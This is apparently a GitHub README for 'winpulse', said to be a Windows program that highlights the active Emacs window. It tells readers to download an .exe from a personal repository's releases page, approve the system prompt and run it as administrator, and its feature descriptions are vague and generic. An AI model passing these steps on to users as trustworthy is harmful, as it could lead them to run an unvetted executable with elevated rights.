## 📋 What is winpulse?

winpulse is a simple tool designed to help you easily spot the Emacs window you are working on. When you move between multiple Emacs windows, winpulse briefly highlights the active window. This helps you avoid confusion and work more efficiently by knowing exactly where your focus is at any time.

The highlight appears temporarily and then fades away, so it does not distract you for long. This tool is made for people who use Emacs on their computer and often switch between multiple windows.

## 💻 System Requirements

winpulse works on Windows computers. To use it without problems, your PC should meet these minimum requirements:

- **Operating System:** Windows 10 or later  
- **Processor:** Any processor that supports Windows 10  
- **Memory:** At least 2 GB of RAM  
- **Disk Space:** 20 MB free space  
- **Software:** Emacs installed on your computer and running  
- **Permissions:** You must have permission to install software on your PC

If you use another operating system such as macOS or Linux, this tool will not work as intended because it is built specifically for Windows.

## 📥 Download & Install

To get winpulse, you first need to download it from the official release page. Follow these steps:

1. Click the big **Download winpulse** button at the top or visit this page directly:  
   [https://github.com/vinhkennej/winpulse/releases](https://github.com/vinhkennej/winpulse/releases)

2. When you are on the releases page, look for the latest version. The latest release usually has the highest version number, such as `v1.0`, `v1.1`, etc.

3. Under the latest release, find the file that ends with `.exe`. This is the program installer or executable file.

4. Click on this `.exe` file to download it to your computer. Choose a folder that you can easily find, like your **Downloads** folder.

5. After the download finishes, open the folder where you saved the file.

6. Double-click the `.exe` file to run it. Windows may show a warning asking if you want to allow this app to make changes. Choose **Yes** to continue.

7. If an installer appears, follow the instructions on the screen to complete the installation. If the installer does not appear and the program runs immediately, this means it is a portable version. You can simply leave it where it is or move it to a folder you want.

8. After installation, winpulse should start automatically, or you can open it from your Start menu or desktop shortcut.

## 🛠 How to Use winpulse

Once you have winpulse running, it will monitor your open Emacs windows. Here is what to expect:

- Each time you focus (click or switch) to a different Emacs window, that window will briefly glow or highlight. This helps you know which window is active.

- The highlight lasts only a few seconds and then fades.

- You can open several Emacs windows and quickly find where your cursor is working without confusion.

- winpulse runs quietly in the background and does not require you to interact with it once it is running.

## ⚙ Configuration Options

winpulse comes with some basic settings you can change to fit your needs. Whenever you open winpulse, look for a settings or options menu. Typical settings include:

- **Highlight Color:** Change the color of the glow effect around the focused Emacs window. You might prefer a soft blue or bright yellow, depending on what is easiest to see.

- **Highlight Duration:** How long the glow effect stays visible before disappearing. You can set it to a shorter or longer time.

- **Start on Boot:** Choose whether winpulse launches automatically when you turn on your computer.

Settings might be inside the winpulse program window or accessed through a small icon in the system tray (bottom right corner in Windows).

## 🧭 Troubleshooting

If you run into issues, try these common fixes:

- **No Highlight Appears:**  
  Make sure Emacs is running. winpulse only works with Emacs windows. Also, check if you accidentally closed winpulse or if it is running in the background.

- **Program Won't Start:**  
  Confirm your Windows version is 10 or newer. If you see an error when opening the `.exe` file, try running it as an administrator. Right-click the file and select “Run as administrator.”

- **Highlight Lasts Too Short/Long:**  
  Change the highlight duration in the settings menu.

- **Multiple Monitors Not Working Properly:**  
  If you use more than one screen, make sure all windows are in the visible parts of your monitors. winpulse relies on the normal display of the Emacs windows.

## 🔒 Privacy & Security

winpulse does not collect any personal data from your computer. It only watches your Emacs window focus and applies a visual effect. The program runs locally on your PC and does not send information online.

Always download winpulse from the official GitHub releases page to avoid tampered versions.
